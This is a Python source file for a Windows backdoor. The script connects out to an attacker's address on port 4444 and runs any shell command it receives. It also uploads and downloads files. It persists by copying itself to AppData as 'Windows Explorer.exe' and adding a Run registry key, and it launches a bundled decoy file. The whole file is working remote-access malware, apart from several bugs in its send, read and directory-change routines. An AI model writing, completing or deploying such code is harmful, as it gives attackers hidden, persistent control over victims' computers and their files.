#!/usr/bin/env python
import base64
import socket
import subprocess
import json
import os
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # ip

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_work_directory(self, path):
        os.chdir(path)
        return "[+] Current directory is:"

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Download ended"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64decode(f.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_work_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                print("[-] Undefined command")

            self.reliable_send(command_result)

file_name = sys._MEIPASS + "" #filename
subprocess.Popen(file_name, shell=True)

try:
    my_Backdoor = Backdoor("", 4444)
    my_Backdoor.run()

except Exception:
    sys.exit()
